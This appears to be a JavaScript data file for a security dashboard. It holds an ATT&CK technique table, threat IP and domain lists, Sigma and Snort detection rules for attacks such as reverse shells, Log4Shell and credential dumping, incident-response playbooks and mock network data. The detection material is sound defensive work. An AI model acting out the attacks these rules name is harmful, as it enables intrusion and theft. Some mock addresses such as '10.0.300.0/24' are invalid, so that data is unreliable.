    { id: 'T1059', name: 'Command and Scripting', desc: 'Execute commands via cmd, PowerShell, bash, Python', detection: 'Process creation logs (Sysmon EID 1), script block logging' },
    { id: 'T1059.001', name: 'PowerShell', desc: 'Execute PowerShell scripts and commands', detection: 'PowerShell Script Block Logging (EID 4104)' },
    { id: 'T1047', name: 'WMI', desc: 'Execute commands via Windows Management Instrumentation', detection: 'Sysmon WMI events, WMI activity logging' },
    { id: 'T1053', name: 'Scheduled Task/Job', desc: 'Execute via cron, at, scheduled tasks', detection: 'Task creation events (EID 4698), cron log monitoring' },
    { id: 'T1204', name: 'User Execution', desc: 'Rely on user to open malicious file or link', detection: 'Endpoint process monitoring after file open events' },
  ],
  'Persistence': [
    { id: 'T1547.001', name: 'Registry Run Keys', desc: 'Add autorun via registry Run/RunOnce keys', detection: 'Registry modification monitoring (Sysmon EID 13)' },
    { id: 'T1053.005', name: 'Scheduled Task', desc: 'Create persistent scheduled task', detection: 'Windows EID 4698, Sysmon EID 1' },
    { id: 'T1543.003', name: 'Windows Service', desc: 'Install malicious service for persistence', detection: 'Service creation events (EID 7045, 4697)' },
    { id: 'T1546.003', name: 'WMI Event Subscription', desc: 'Persistent fileless WMI event consumer', detection: 'WMI event subscription monitoring' },
    { id: 'T1505.003', name: 'Web Shell', desc: 'Plant web shell in web server directory', detection: 'File integrity monitoring, web shell detection tools' },
    { id: 'T1098.004', name: 'SSH Authorized Keys', desc: 'Add attacker SSH key for persistent access', detection: 'Monitor authorized_keys file changes' },
    { id: 'T1574.001', name: 'DLL Search Order Hijack', desc: 'Place malicious DLL in application path', detection: 'DLL load monitoring (Sysmon EID 7)' },
    { id: 'T1556.001', name: 'Modify Auth Process', desc: 'Skeleton Key or modify authentication', detection: 'LSASS modification detection, auth anomalies' },
  ],
  'Privilege Escalation': [
    { id: 'T1068', name: 'Exploitation for Privesc', desc: 'Exploit kernel or service vulnerability for elevation', detection: 'Process privilege changes, exploit signatures' },
    { id: 'T1548', name: 'Abuse Elevation Mechanisms', desc: 'Bypass UAC, sudo, setuid for privilege escalation', detection: 'UAC bypass detection, sudo log monitoring' },
    { id: 'T1134', name: 'Access Token Manipulation', desc: 'Impersonate or steal access tokens', detection: 'Token manipulation events, SeImpersonatePrivilege use' },
    { id: 'T1055', name: 'Process Injection', desc: 'Inject code into another process', detection: 'Sysmon EID 8/10, memory modification detection' },
  ],
  'Defense Evasion': [
    { id: 'T1070', name: 'Indicator Removal', desc: 'Clear logs, timestamps, or artifacts', detection: 'Log clearing events (EID 1102), gap detection' },
    { id: 'T1027', name: 'Obfuscated Files/Info', desc: 'Encode, encrypt, or obfuscate payloads', detection: 'Entropy analysis, deobfuscation tools' },
    { id: 'T1218', name: 'System Binary Proxy Exec', desc: 'Use LOLBins (mshta, rundll32, certutil)', detection: 'LOLBin execution monitoring' },
    { id: 'T1562', name: 'Impair Defenses', desc: 'Disable AV, EDR, logging, or firewall', detection: 'Service stop events, tamper protection alerts' },
    { id: 'T1036', name: 'Masquerading', desc: 'Rename files/processes to appear legitimate', detection: 'File name/path anomaly detection' },
  ],
  'Credential Access': [
    { id: 'T1003', name: 'OS Credential Dumping', desc: 'Dump credentials from LSASS, SAM, NTDS.dit', detection: 'LSASS access monitoring (Sysmon EID 10)' },
    { id: 'T1558.001', name: 'Golden Ticket', desc: 'Forge Kerberos TGT with krbtgt hash', detection: 'Anomalous TGT lifetime, encryption type anomalies' },
    { id: 'T1558.003', name: 'Kerberoasting', desc: 'Request TGS tickets for offline cracking', detection: 'Spike in TGS requests (EID 4769) with RC4 encryption' },
    { id: 'T1110', name: 'Brute Force', desc: 'Attempt many passwords against accounts', detection: 'Failed login threshold alerts (EID 4625)' },
    { id: 'T1552', name: 'Unsecured Credentials', desc: 'Find credentials in files, registries, or history', detection: 'File access monitoring on credential stores' },
    { id: 'T1557', name: 'Adversary in the Middle', desc: 'LLMNR/NBT-NS poisoning, ARP spoofing', detection: 'Network anomaly detection, LLMNR/NBT-NS logging' },
  ],
  'Discovery': [
    { id: 'T1046', name: 'Network Service Discovery', desc: 'Scan internal network for services', detection: 'Internal port scan detection in network flow' },
    { id: 'T1087', name: 'Account Discovery', desc: 'Enumerate user accounts', detection: 'LDAP query monitoring, net user execution' },
    { id: 'T1082', name: 'System Information Discovery', desc: 'Collect hostname, OS version, hardware info', detection: 'Reconnaissance command execution monitoring' },
    { id: 'T1083', name: 'File and Directory Discovery', desc: 'Enumerate files and directories', detection: 'Large-scale file access patterns' },
    { id: 'T1069', name: 'Permission Group Discovery', desc: 'Enumerate domain groups and memberships', detection: 'AD enumeration monitoring (BloodHound detection)' },
  ],
  'Lateral Movement': [
    { id: 'T1550.002', name: 'Pass the Hash', desc: 'Authenticate with NTLM hash without cracking', detection: 'Logon Type 9, NTLM authentication anomalies' },
    { id: 'T1550.003', name: 'Pass the Ticket', desc: 'Use stolen Kerberos tickets to authenticate', detection: 'Ticket reuse detection, anomalous Kerberos auth' },
    { id: 'T1021.002', name: 'SMB/Windows Admin Shares', desc: 'Move laterally via ADMIN$/C$ shares', detection: 'Admin share access monitoring (EID 5140)' },
    { id: 'T1021.006', name: 'Windows Remote Management', desc: 'Use WinRM for remote command execution', detection: 'WinRM connection logging' },
    { id: 'T1021.004', name: 'SSH', desc: 'Use stolen SSH keys for lateral movement', detection: 'SSH authentication monitoring, key-based auth logging' },
    { id: 'T1563.002', name: 'RDP Hijacking', desc: 'Hijack existing RDP sessions', detection: 'Session switch events (tscon usage)' },
  ],
  'Collection': [
    { id: 'T1005', name: 'Data from Local System', desc: 'Collect files from the local filesystem', detection: 'Bulk file access patterns' },
    { id: 'T1114', name: 'Email Collection', desc: 'Collect emails from mailbox or server', detection: 'Mailbox access monitoring, PST export detection' },
    { id: 'T1074', name: 'Data Staged', desc: 'Stage collected data in a central location', detection: 'Large file creation in temp/staging directories' },
    { id: 'T1056', name: 'Input Capture', desc: 'Keylogger or credential interception', detection: 'API hooking detection, keylogger signatures' },
  ],
  'Command and Control': [
    { id: 'T1071', name: 'Application Layer Protocol', desc: 'Use HTTP/S, DNS, or other protocols for C2', detection: 'Beaconing detection, JA3/JA4 fingerprinting' },
    { id: 'T1573', name: 'Encrypted Channel', desc: 'Encrypt C2 communications', detection: 'TLS inspection, certificate anomalies' },
    { id: 'T1090', name: 'Proxy', desc: 'Use proxy infrastructure to relay C2', detection: 'Proxy chain detection, multi-hop analysis' },
    { id: 'T1572', name: 'Protocol Tunneling', desc: 'Tunnel C2 inside legitimate protocols', detection: 'DNS tunnel detection (entropy, query length)' },
    { id: 'T1095', name: 'Non-Application Layer Protocol', desc: 'Use ICMP, raw sockets for C2', detection: 'ICMP payload analysis, non-standard protocol use' },
  ],
  'Exfiltration': [
    { id: 'T1048', name: 'Exfiltration Over Alternative Protocol', desc: 'Exfiltrate data via DNS, ICMP, or non-standard channels', detection: 'DNS query volume anomalies, ICMP payload analysis' },
    { id: 'T1567', name: 'Exfiltration Over Web Service', desc: 'Upload data to cloud storage or paste sites', detection: 'Cloud storage upload monitoring, DLP alerts' },
    { id: 'T1041', name: 'Exfiltration Over C2 Channel', desc: 'Send data out through existing C2 connection', detection: 'Outbound data volume monitoring' },
    { id: 'T1029', name: 'Scheduled Transfer', desc: 'Exfiltrate data on a schedule to avoid detection', detection: 'Regular interval outbound transfers' },
  ],
  'Impact': [
    { id: 'T1486', name: 'Data Encrypted for Impact', desc: 'Ransomware encryption of files', detection: 'Mass file encryption detection, canary file monitoring' },
    { id: 'T1485', name: 'Data Destruction', desc: 'Wipe or corrupt data', detection: 'Mass file deletion, MBR modification' },
    { id: 'T1489', name: 'Service Stop', desc: 'Stop critical services for disruption', detection: 'Critical service stop monitoring' },
    { id: 'T1561', name: 'Disk Wipe', desc: 'Wipe disk or partition', detection: 'Disk write to MBR/GPT, dd/diskpart usage' },
  ],
};

// ============================================================================
// IOC THREAT DATABASE
// ============================================================================
const THREAT_IPS = [
  '185.220.101.0/24','185.220.102.0/24','45.33.32.0/24','104.244.72.0/24','198.96.155.0/24',
  '23.129.64.0/24','171.25.193.0/24','199.249.230.0/24','204.8.156.0/24','209.141.32.0/24',
  '5.188.86.0/24','91.219.237.0/24','185.100.87.0/24','192.42.116.0/24','178.175.131.0/24',
  '62.102.148.0/24','195.176.3.0/24','185.56.83.0/24','193.218.118.0/24','89.234.157.0/24',
  '103.15.28.0/24','141.136.0.0/16','45.154.255.0/24','193.142.146.0/24','45.95.169.0/24',
];
const THREAT_DOMAINS = [
  'evil.com','malware-c2.xyz','darkside-ransom.onion','cobaltstrike-c2.net','apt-staging.ru',
  'phish-login.com','fake-microsoft.xyz','update-flash.com','secure-paypal-verify.com',
  'google-drive-share.net','outlook-verify-account.com','amazon-security-alert.com',
];
const DGA_PATTERNS = [
  /^[a-z]{12,}\.(?:com|net|org|info|biz|xyz)$/,
  /^[a-z0-9]{16,}\.(com|net|top|xyz)$/,
  /^[bcdfghjklmnpqrstvwxyz]{8,}\.(com|net)$/,
];


// ============================================================================
// SIGMA RULE TEMPLATES
// ============================================================================
const SIGMA_TEMPLATES = [
  { title: 'Mimikatz LSASS Access', level: 'critical', logsource: 'sysmon', detection: 'EventID: 10, TargetImage: *lsass.exe', mitre: 'T1003.001' },
  { title: 'PowerShell Encoded Command', level: 'high', logsource: 'powershell', detection: 'EventID: 4104, ScriptBlockText contains -enc or -EncodedCommand', mitre: 'T1059.001' },
  { title: 'Suspicious Service Installation', level: 'high', logsource: 'system', detection: 'EventID: 7045, ServiceFileName contains cmd.exe or powershell', mitre: 'T1543.003' },
  { title: 'DCSync Attack', level: 'critical', logsource: 'security', detection: 'EventID: 4662, Properties contains 1131f6aa-9c07-11d1-f79f', mitre: 'T1003.006' },
  { title: 'Kerberoasting', level: 'high', logsource: 'security', detection: 'EventID: 4769, TicketEncryptionType: 0x17, ServiceName not krbtgt', mitre: 'T1558.003' },
  { title: 'PsExec Service', level: 'medium', logsource: 'system', detection: 'EventID: 7045, ServiceName: PSEXESVC', mitre: 'T1569.002' },
  { title: 'Scheduled Task Creation', level: 'medium', logsource: 'security', detection: 'EventID: 4698', mitre: 'T1053.005' },
  { title: 'Registry Run Key Modification', level: 'medium', logsource: 'sysmon', detection: 'EventID: 13, TargetObject contains CurrentVersion\\Run', mitre: 'T1547.001' },
  { title: 'WMI Process Creation', level: 'medium', logsource: 'sysmon', detection: 'EventID: 1, ParentImage: *wmiprvse.exe', mitre: 'T1047' },
  { title: 'Suspicious DLL Load', level: 'medium', logsource: 'sysmon', detection: 'EventID: 7, ImageLoaded from Temp or Downloads', mitre: 'T1574.001' },
  { title: 'Log Clearing', level: 'high', logsource: 'security', detection: 'EventID: 1102', mitre: 'T1070.001' },
  { title: 'RDP Brute Force', level: 'high', logsource: 'security', detection: 'EventID: 4625, LogonType: 10, count > 10 in 5 min', mitre: 'T1110' },
  { title: 'Golden Ticket Usage', level: 'critical', logsource: 'security', detection: 'EventID: 4769, anomalous TGT lifetime > 10 hours', mitre: 'T1558.001' },
  { title: 'Web Shell Detection', level: 'critical', logsource: 'sysmon', detection: 'EventID: 1, ParentImage: *w3wp.exe, Image: *cmd.exe or *powershell.exe', mitre: 'T1505.003' },
  { title: 'LOLBIN Execution', level: 'medium', logsource: 'sysmon', detection: 'EventID: 1, Image: *mshta.exe or *certutil.exe or *regsvr32.exe', mitre: 'T1218' },
  { title: 'SSH Brute Force', level: 'high', logsource: 'auth', detection: 'Failed password in auth.log > 10 from same IP', mitre: 'T1110.001' },
  { title: 'Sudo Privilege Escalation', level: 'high', logsource: 'auth', detection: 'sudo command from unexpected user', mitre: 'T1548.003' },
  { title: 'Cron Persistence', level: 'medium', logsource: 'syslog', detection: 'crontab REPLACE or new file in /etc/cron.d', mitre: 'T1053.003' },
  { title: 'DNS Tunneling', level: 'high', logsource: 'dns', detection: 'TXT queries > 100 chars or high query volume to single domain', mitre: 'T1572' },
  { title: 'Data Exfiltration Large Transfer', level: 'high', logsource: 'proxy', detection: 'Outbound transfer > 100MB to external host', mitre: 'T1048' },
  { title: 'Process Injection', level: 'critical', logsource: 'sysmon', detection: 'EventID: 8 (CreateRemoteThread) or 10 (ProcessAccess to foreign process)', mitre: 'T1055' },
  { title: 'AV/EDR Tampering', level: 'critical', logsource: 'system', detection: 'Security product service stopped or disabled', mitre: 'T1562.001' },
  { title: 'NTDS.dit Access', level: 'critical', logsource: 'sysmon', detection: 'File access to ntds.dit or SYSTEM registry hive', mitre: 'T1003.003' },
  { title: 'AS-REP Roasting', level: 'high', logsource: 'security', detection: 'EventID: 4768, PreAuthType: 0, multiple accounts', mitre: 'T1558.004' },
  { title: 'Ransomware File Encryption', level: 'critical', logsource: 'sysmon', detection: 'EventID: 11, mass file creation with unusual extensions', mitre: 'T1486' },
  { title: 'Shadow Copy Deletion', level: 'critical', logsource: 'sysmon', detection: 'EventID: 1, Image: *vssadmin.exe, CommandLine: *delete shadows*', mitre: 'T1490' },
  { title: 'BloodHound Collection', level: 'high', logsource: 'sysmon', detection: 'EventID: 1, Image: *SharpHound* or CommandLine: *Invoke-BloodHound*', mitre: 'T1087.002' },
  { title: 'Impacket Execution', level: 'critical', logsource: 'security', detection: 'Service creation with random 8-char name or known Impacket patterns', mitre: 'T1569.002' },
  { title: 'Pass-the-Hash', level: 'critical', logsource: 'security', detection: 'EventID: 4624, LogonType: 9, AuthPackage: NTLM', mitre: 'T1550.002' },
  { title: 'Cobalt Strike Beacon', level: 'critical', logsource: 'network', detection: 'Regular interval HTTPS connections with consistent size to single host', mitre: 'T1071.001' },
];

// ============================================================================
// SNORT RULE TEMPLATES
// ============================================================================
const SNORT_TEMPLATES = [
  { sid: 100001, msg: 'SQL Injection Attempt', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"SQL Injection Attempt"; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; sid:100001; rev:1;)' },
  { sid: 100002, msg: 'XSS Attempt', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"XSS Attempt"; content:"<script"; nocase; sid:100002; rev:1;)' },
  { sid: 100003, msg: 'Command Injection', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Command Injection Attempt"; content:"|3b|"; content:"cat"; distance:0; sid:100003; rev:1;)' },
  { sid: 100004, msg: 'Path Traversal', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Path Traversal Attempt"; content:"../"; sid:100004; rev:1;)' },
  { sid: 100005, msg: 'Log4Shell JNDI', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Log4Shell JNDI Injection"; content:"${jndi:"; nocase; sid:100005; rev:1;)' },
  { sid: 100006, msg: 'EternalBlue SMB', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 445 (msg:"EternalBlue Exploit Attempt"; content:"|ff|SMB"; depth:4; content:"|23 00 00 00 07 00|"; distance:0; sid:100006; rev:1;)' },
  { sid: 100007, msg: 'Shellshock CGI', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (msg:"Shellshock Attempt"; content:"() {"; sid:100007; rev:1;)' },
  { sid: 100008, msg: 'DNS Zone Transfer', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 53 (msg:"DNS Zone Transfer Attempt"; content:"|00 fc|"; offset:14; sid:100008; rev:1;)' },
  { sid: 100009, msg: 'Nmap SYN Scan', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:"Nmap SYN Scan Detected"; flags:S; threshold:type threshold, track by_src, count 20, seconds 60; sid:100009; rev:1;)' },
  { sid: 100010, msg: 'SSH Brute Force', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 22 (msg:"SSH Brute Force Attempt"; threshold:type threshold, track by_src, count 5, seconds 60; sid:100010; rev:1;)' },
  { sid: 100011, msg: 'ICMP Tunnel Suspected', rule: 'alert icmp $HOME_NET any -> $EXTERNAL_NET any (msg:"ICMP Tunnel Suspected"; dsize:>100; threshold:type threshold, track by_src, count 50, seconds 60; sid:100011; rev:1;)' },
  { sid: 100012, msg: 'Reverse Shell Detected', rule: 'alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Reverse Shell Connection"; content:"/bin/sh"; sid:100012; rev:1;)' },
  { sid: 100013, msg: 'Cobalt Strike Beacon', rule: 'alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:"Cobalt Strike Beacon Suspected"; content:"Accept: */*"; content:"Cookie:"; distance:0; threshold:type threshold, track by_src, count 10, seconds 300; sid:100013; rev:1;)' },
  { sid: 100014, msg: 'DNS Tunneling', rule: 'alert udp $HOME_NET any -> any 53 (msg:"DNS Tunneling - Long Query"; content:"|00 10|"; byte_test:1,>,50,0,relative; sid:100014; rev:1;)' },
  { sid: 100015, msg: 'SMB Lateral Movement', rule: 'alert tcp $HOME_NET any -> $HOME_NET 445 (msg:"Internal SMB Admin Share Access"; content:"|ff|SMB"; content:"ADMIN$"; nocase; sid:100015; rev:1;)' },
  { sid: 100016, msg: 'LDAP Enumeration', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 389 (msg:"LDAP Enumeration - Anonymous Bind"; content:"|30|"; depth:1; content:"|60|"; distance:0; sid:100016; rev:1;)' },
  { sid: 100017, msg: 'ProxyLogon Exploit', rule: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:"ProxyLogon SSRF Attempt"; content:"/ecp/"; content:"X-BEResource"; nocase; sid:100017; rev:1;)' },
  { sid: 100018, msg: 'Data Exfiltration', rule: 'alert tcp $HOME_NET any -> $EXTERNAL_NET any (msg:"Large Outbound Transfer - Possible Exfiltration"; threshold:type both, track by_src, count 1, seconds 60; dsize:>50000; sid:100018; rev:1;)' },
  { sid: 100019, msg: 'Ransomware Extension', rule: 'alert tcp $HOME_NET any -> $HOME_NET 445 (msg:"Ransomware File Extension Detected"; content:".encrypted"; sid:100019; rev:1;)' },
  { sid: 100020, msg: 'Kerberoast TGS Request', rule: 'alert tcp $HOME_NET any -> $HOME_NET 88 (msg:"Potential Kerberoasting - Excessive TGS Requests"; threshold:type threshold, track by_src, count 10, seconds 60; sid:100020; rev:1;)' },
];

// ============================================================================
// IR PLAYBOOKS
// ============================================================================
const IR_PLAYBOOKS = [
  { name: 'Ransomware', severity: 'Critical', steps: ['Isolate affected systems from network immediately','Preserve evidence - do NOT wipe or rebuild yet','Identify ransomware variant from ransom note or encrypted file extensions','Determine scope: which systems, data, and backups are affected','Check if backups are intact and unencrypted','Engage legal counsel and cyber insurance carrier','Report to law enforcement (FBI IC3, CISA)','Begin recovery from clean backups (if available)','Change all credentials domain-wide','Conduct root cause analysis - how did they get in','Implement detection for the initial access vector','Document timeline and lessons learned'] },
  { name: 'Data Breach', severity: 'Critical', steps: ['Confirm the breach - verify scope and data types affected','Preserve all logs and evidence','Engage forensics team for investigation','Determine regulatory notification requirements (GDPR 72hr, HIPAA 60 days, state laws)','Notify legal counsel and cyber insurance','Begin drafting notification to affected individuals','Set up credit monitoring for affected persons','Issue public statement if required','Remediate the vulnerability that led to the breach','Review and update data handling procedures','File required regulatory notifications','Conduct post-incident review'] },
  { name: 'Phishing Compromise', severity: 'High', steps: ['Identify all recipients of the phishing email','Determine who clicked/opened - check email gateway and proxy logs','Reset passwords for compromised accounts immediately','Enable MFA if not already active','Scan endpoints of affected users for malware','Check for email forwarding rules set by attacker','Review login history for compromised accounts','Block sender domain/IP at email gateway','Search for similar phishing emails in quarantine','Send security awareness reminder to organization','Update phishing detection rules','Document IOCs and share with threat intel'] },
  { name: 'DDoS Attack', severity: 'High', steps: ['Confirm DDoS vs legitimate traffic spike','Engage DDoS mitigation provider (Cloudflare, Akamai, AWS Shield)','Enable rate limiting and geo-blocking if applicable','Identify attack type (volumetric, protocol, application layer)','Work with ISP for upstream filtering','Document attack patterns for post-incident analysis','Monitor for secondary attacks during the DDoS (distraction technique)','Restore normal operations once attack subsides','Review and improve DDoS resilience','Update incident response runbook'] },
  { name: 'Insider Threat', severity: 'High', steps: ['Preserve all evidence before confronting the insider','Review access logs, file access, email, and USB activity','Determine what data was accessed or exfiltrated','Coordinate with HR and legal before taking action','Disable the insider access immediately when ready','Image their workstation and mobile devices','Review their access to all systems and revoke','Check for backdoors or additional accounts created','Assess damage and data exposure','Report to law enforcement if criminal activity suspected','Implement enhanced monitoring for similar behavior','Review access controls and principle of least privilege'] },
  { name: 'Unauthorized Access', severity: 'High', steps: ['Identify the compromised account or system','Determine how access was gained (stolen creds, exploit, misconfiguration)','Reset compromised credentials','Review all actions taken by the unauthorized party','Check for persistence mechanisms (backdoors, new accounts, SSH keys)','Remove any attacker-installed tools or malware','Patch or remediate the initial access vector','Review and restrict access controls','Enable enhanced logging on affected systems','Monitor for re-compromise','Update detection rules','Document incident timeline'] },
  { name: 'Malware Infection', severity: 'Medium', steps: ['Isolate infected system from network','Identify malware variant using AV/EDR alerts','Determine infection vector (email, web, USB, lateral)','Check for lateral spread to other systems','Collect malware sample for analysis','Remove malware and clean affected systems','Reset credentials used on infected system','Scan all systems with updated signatures','Block IOCs (hashes, domains, IPs) at perimeter','Review and update endpoint protection','Submit sample to AV vendors','Document and close incident'] },
  { name: 'Web Application Attack', severity: 'Medium', steps: ['Identify attack type (SQLi, XSS, RCE, etc.) from WAF/application logs','Block attacker IP at WAF/firewall','Assess if attack was successful - check for data access or code execution','Preserve web server logs as evidence','If compromised: take application offline, preserve evidence','Patch the vulnerability immediately','Review application for similar vulnerabilities','Deploy WAF rules to prevent similar attacks','Reset any compromised credentials or sessions','Conduct security code review','Perform penetration test after remediation','Update secure coding guidelines'] },
  { name: 'Cloud Account Compromise', severity: 'Critical', steps: ['Identify compromised cloud credentials/tokens','Revoke all active sessions and rotate credentials','Review CloudTrail/Activity Logs for unauthorized actions','Check for new IAM users, roles, or policies created','Review resource creation (EC2, Lambda, S3 buckets)','Check for data access or exfiltration from storage','Remove any attacker-created resources','Review and restrict IAM policies (least privilege)','Enable MFA on all cloud accounts','Review security group and network ACL changes','Set up billing alerts for unusual spending','Enable GuardDuty/Security Hub/Defender'] },
  { name: 'Supply Chain Compromise', severity: 'Critical', steps: ['Identify the compromised software/vendor/component','Determine which systems have the affected component installed','Isolate affected systems if active compromise is suspected','Contact the vendor for remediation guidance','Review network logs for C2 communications from affected systems','Check for signs of post-compromise activity','Remove or downgrade the compromised component','Scan affected systems for backdoors or implants','Review software update mechanisms and integrity checks','Implement software composition analysis (SCA)','Review vendor security assessment process','Report to CISA/relevant authorities'] },
];


// ============================================================================
// NETWORK OPERATIONS CENTER (NOC) DATA
// ============================================================================
const NOC_TOPOLOGY = [
  { id: 'fw-01', type: 'firewall', label: 'FW-PERIMETER-01', ip: '10.0.0.1', status: 'online', cpu: 34, mem: 52, x: 400, y: 40 },
  { id: 'fw-02', type: 'firewall', label: 'FW-PERIMETER-02', ip: '10.0.0.2', status: 'online', cpu: 28, mem: 48, x: 600, y: 40 },
  { id: 'rtr-core', type: 'router', label: 'RTR-CORE-01', ip: '10.0.1.1', status: 'online', cpu: 22, mem: 38, x: 500, y: 140 },
  { id: 'sw-dist-1', type: 'switch', label: 'SW-DIST-01', ip: '10.0.2.1', status: 'online', cpu: 15, mem: 30, x: 300, y: 240 },
  { id: 'sw-dist-2', type: 'switch', label: 'SW-DIST-02', ip: '10.0.2.2', status: 'online', cpu: 18, mem: 32, x: 500, y: 240 },
  { id: 'sw-dist-3', type: 'switch', label: 'SW-DIST-03', ip: '10.0.2.3', status: 'warning', cpu: 78, mem: 85, x: 700, y: 240 },
  { id: 'srv-dc01', type: 'server', label: 'DC-01', ip: '10.0.10.1', status: 'online', cpu: 45, mem: 62, x: 200, y: 360 },
  { id: 'srv-dc02', type: 'server', label: 'DC-02', ip: '10.0.10.2', status: 'online', cpu: 38, mem: 55, x: 300, y: 360 },
  { id: 'srv-web01', type: 'server', label: 'WEB-01', ip: '10.0.20.1', status: 'online', cpu: 67, mem: 72, x: 400, y: 360 },
  { id: 'srv-web02', type: 'server', label: 'WEB-02', ip: '10.0.20.2', status: 'critical', cpu: 95, mem: 91, x: 500, y: 360 },
  { id: 'srv-db01', type: 'server', label: 'DB-01', ip: '10.0.30.1', status: 'online', cpu: 55, mem: 78, x: 600, y: 360 },
  { id: 'srv-db02', type: 'server', label: 'DB-02', ip: '10.0.30.2', status: 'online', cpu: 42, mem: 65, x: 700, y: 360 },
  { id: 'srv-mail', type: 'server', label: 'MAIL-01', ip: '10.0.40.1', status: 'online', cpu: 30, mem: 45, x: 800, y: 360 },
  { id: 'ep-vlan10', type: 'endpoint', label: 'VLAN10-WKS', ip: '10.0.100.0/24', status: 'online', cpu: 0, mem: 0, x: 150, y: 480 },
  { id: 'ep-vlan20', type: 'endpoint', label: 'VLAN20-WKS', ip: '10.0.200.0/24', status: 'online', cpu: 0, mem: 0, x: 350, y: 480 },
  { id: 'ep-vlan30', type: 'endpoint', label: 'VLAN30-DEV', ip: '10.0.300.0/24', status: 'warning', cpu: 0, mem: 0, x: 550, y: 480 },
  { id: 'ep-wifi', type: 'endpoint', label: 'WIFI-CORP', ip: '172.16.0.0/16', status: 'online', cpu: 0, mem: 0, x: 750, y: 480 },
];

const NOC_LINKS = [
  { from: 'fw-01', to: 'rtr-core', bw: 10000, used: 3200, proto: '10GbE' },
  { from: 'fw-02', to: 'rtr-core', bw: 10000, used: 2800, proto: '10GbE' },
  { from: 'rtr-core', to: 'sw-dist-1', bw: 10000, used: 4500, proto: '10GbE' },
  { from: 'rtr-core', to: 'sw-dist-2', bw: 10000, used: 5200, proto: '10GbE' },
  { from: 'rtr-core', to: 'sw-dist-3', bw: 10000, used: 8900, proto: '10GbE' },
  { from: 'sw-dist-1', to: 'srv-dc01', bw: 1000, used: 340, proto: '1GbE' },
  { from: 'sw-dist-1', to: 'srv-dc02', bw: 1000, used: 280, proto: '1GbE' },
  { from: 'sw-dist-2', to: 'srv-web01', bw: 1000, used: 780, proto: '1GbE' },
  { from: 'sw-dist-2', to: 'srv-web02', bw: 1000, used: 950, proto: '1GbE' },
  { from: 'sw-dist-3', to: 'srv-db01', bw: 1000, used: 620, proto: '1GbE' },
  { from: 'sw-dist-3', to: 'srv-db02', bw: 1000, used: 480, proto: '1GbE' },
  { from: 'sw-dist-3', to: 'srv-mail', bw: 1000, used: 190, proto: '1GbE' },
  { from: 'sw-dist-1', to: 'ep-vlan10', bw: 1000, used: 210, proto: '1GbE' },
  { from: 'sw-dist-1', to: 'ep-vlan20', bw: 1000, used: 340, proto: '1GbE' },
  { from: 'sw-dist-2', to: 'ep-vlan30', bw: 1000, used: 560, proto: '1GbE' },
  { from: 'sw-dist-3', to: 'ep-wifi', bw: 1000, used: 720, proto: '1GbE' },
];

const NOC_CONNECTIONS = [
  { src: '10.0.100.45', dst: '10.0.20.1', proto: 'HTTPS', port: 443, bytes: 1245780, state: 'ESTABLISHED', duration: '02:14:33' },
  { src: '10.0.200.12', dst: '10.0.30.1', proto: 'MySQL', port: 3306, bytes: 8934210, state: 'ESTABLISHED', duration: '00:45:12' },
  { src: '10.0.100.78', dst: '10.0.10.1', proto: 'LDAP', port: 389, bytes: 234560, state: 'ESTABLISHED', duration: '00:02:45' },
  { src: '185.220.101.34', dst: '10.0.20.1', proto: 'HTTPS', port: 443, bytes: 45230, state: 'SYN_RECV', duration: '00:00:03' },
  { src: '10.0.300.15', dst: '10.0.30.2', proto: 'SSH', port: 22, bytes: 567890, state: 'ESTABLISHED', duration: '01:30:00' },
  { src: '172.16.5.44', dst: '10.0.40.1', proto: 'SMTP', port: 25, bytes: 123450, state: 'ESTABLISHED', duration: '00:00:45' },
  { src: '45.33.32.100', dst: '10.0.0.1', proto: 'TCP', port: 8080, bytes: 12340, state: 'SYN_SENT', duration: '00:00:01' },
  { src: '10.0.100.22', dst: '10.0.20.2', proto: 'HTTP', port: 80, bytes: 2345670, state: 'ESTABLISHED', duration: '00:15:22' },
  { src: '10.0.200.88', dst: '10.0.10.2', proto: 'Kerberos', port: 88, bytes: 45670, state: 'TIME_WAIT', duration: '00:00:12' },
  { src: '104.244.72.15', dst: '10.0.20.1', proto: 'HTTPS', port: 443, bytes: 890120, state: 'ESTABLISHED', duration: '00:05:33' },
  { src: '10.0.100.55', dst: '8.8.8.8', proto: 'DNS', port: 53, bytes: 12340, state: 'ESTABLISHED', duration: '00:00:01' },
  { src: '10.0.300.90', dst: '10.0.30.1', proto: 'PostgreSQL', port: 5432, bytes: 4567890, state: 'ESTABLISHED', duration: '00:22:10' },
];

const NOC_ANOMALIES = [
  { time: '14:32:18', severity: 'Critical', type: 'Port Scan', src: '185.220.101.34', detail: 'Sequential port scan detected: ports 1-1024 on 10.0.20.1', mitre: 'T1595' },
  { time: '14:28:05', severity: 'High', type: 'Data Exfiltration', src: '10.0.300.15', detail: 'Unusual outbound transfer: 450MB to external IP 45.154.255.10', mitre: 'T1048' },
  { time: '14:25:44', severity: 'High', type: 'Beaconing', src: '10.0.100.78', detail: 'Regular interval connections every 60s to 104.244.72.15:443', mitre: 'T1071.001' },
  { time: '14:22:10', severity: 'Medium', type: 'DNS Tunnel', src: '10.0.200.12', detail: 'High entropy DNS queries to suspicious domain (avg length: 54 chars)', mitre: 'T1572' },
  { time: '14:18:33', severity: 'Medium', type: 'Brute Force', src: '45.33.32.100', detail: '47 failed SSH login attempts to 10.0.10.1 in 5 minutes', mitre: 'T1110' },
  { time: '14:15:00', severity: 'Low', type: 'New Service', src: '10.0.20.2', detail: 'Unknown service started on port 4444 (potential reverse shell)', mitre: 'T1059' },
